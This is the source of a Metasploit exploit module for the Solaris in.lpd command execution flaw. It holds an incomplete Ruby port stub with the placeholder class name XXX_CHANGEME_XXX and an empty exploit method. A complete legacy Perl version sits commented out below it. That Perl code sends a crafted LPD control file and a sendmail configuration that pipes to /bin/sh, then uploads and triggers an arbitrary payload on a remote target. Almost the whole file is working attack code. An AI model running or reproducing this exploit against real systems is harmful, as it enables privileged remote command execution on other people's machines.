require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris LPD Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution flaw in
				the in.lpd service shipped with all versions of Sun Solaris
				up to and including 8.0. This module uses a technique
				discovered by Dino Dai Zovi to exploit the flaw without
				needing to know the resolved name of the attacking system.
					
			},
			'Author'         => [ 'hdm', 'Dino Dai Zovi <ddz@theta44.org>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '15131'],
					[ 'BID', '3274'],
					[ 'MIL', '63'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 8192,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'solaris',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 31 2001',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_lpd_exec;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'		=> 'Solaris LPD Command Execution',
	'Version'	=> '$Revision$',
	'Authors'	=>
	  [
		'H D Moore <hdm [at] metasploit.com>',
		'Dino Dai Zovi <ddz [at] theta44.org>',
	  ],

	'Arch'		=> [ ],
	'OS'		=> [ 'solaris' ],
	'Priv'		=> 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The LPD server port', 515],
	  },

	'Payload' =>
	  {
		'Space'    => 8192,
		'Keys'     => ['cmd'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution flaw in the in.lpd
		service shipped with all versions of Sun Solaris up to and including 8.0.
		This module uses a technique discovered by Dino Dai Zovi to exploit the flaw
		without needing to know the resolved name of the attacking system.
}),

	'Refs'  =>
	  [
		['OSVDB', '15131'],
		['BID',    '3274'],
		['MIL',      '63'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [['No Target Needed']],

	'Keys'  => ['lpd'],

	'DisclosureDate' => 'Aug 31 2001',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('RPATH');
	my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
	my $res;

	# This is the temporary path created in the spool directory
	my $spath = "/var/spool/print";

	# We use one connection to configure the spool directory
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	# Send the job request command with the faked printer spool
	$s->Send("\x02"."metasploit:framework\n");
	$res = $s->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our job request command");
		return;
	}

	# The job ID is squashed down to three decimal digits
	my $jid = ($$ % 1000).unpack("H*",pack('N', time() + $$));

	# The control file
	my $control =
	  "H"."metasploit\n".
	  "P"."\\\"-C".$spath."/".$jid."mail.cf\\\" nobody\n".
	  "f"."dfA".$jid."config\n".
	  "f"."dfA".$jid."script\n";

	# The mail configuration file
	my $mailcf =
	  "V8\n".
	  "\n".
	  "Ou0\n".
	  "Og0\n".
	  "OL0\n".
	  "Oeq\n".
	  "OQX/tmp\n".
	  "\n".
	  "FX|/bin/sh $spath/".$jid."script\n".
	  "\n".
	  "S3\n".
	  "S0\n".
	  "R\$+     \$#local \$\@blah \$:blah\n".
	  "S1\n".
	  "S2\n".
	  "S4\n".
	  "S5\n".
	  "\n".
	  "Mlocal  P=/bin/sh, J=S, S=0, R=0, A=sh $spath/".$jid."script\n".
	  "Mprog   P=/bin/sh, J=S, S=0, R=0, A=sh $spath/".$jid."script\n";

	$self->PrintLine("[*] Configuring the spool directory...");
	if ( ! $self->SendFile($s, 2, "cfA".$jid."metasploit", $control) ||
		! $self->SendFile($s, 3, $jid."mail.cf", $mailcf)        ||
		! $self->SendFile($s, 3, $jid."script", $shellcode)
	  ) { $s->Close; return }

	$self->PrintLine('');

	# We use another connection to trigger the code execution
	my $t = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($t->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $t->GetError);
		return;
	}

	# Send the job request command with the cascaded printer spool
	$t->Send("\x02"."localhost:metasploit\n");
	$res = $t->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our job request command");
		return;
	}

	$self->PrintLine("[*] Triggering the vulnerable call to the mail program...");
	if ( ! $self->SendFile($t, 2, "cfA".$jid."metasploit", $control) ||
		! $self->SendFile($t, 3, "dfa".$jid."config", $mailcf)
	  ) { $t->Close; return }

	$t->Close;

	$self->PrintLine("[*] Waiting 60 seconds for the payload to execute...\n");
	sleep(60);

	return;
}

sub SendFile {
	my $self = shift;
	my $sock = shift;
	my $type = shift;
	my $name = shift;
	my $data = shift;

	$sock->Send(chr($type) .length($data). " $name\n");
	my $res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file command ($name)");
		return;
	}

	$sock->Send($data);
	$sock->Send("\x00");
	$res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file data ($name)");
		return;
	}

	$self->PrintLine(sprintf("[*]     Uploaded %.4d bytes >> $name", length($data)));
	return 1;
}

1;

=end


end
end	
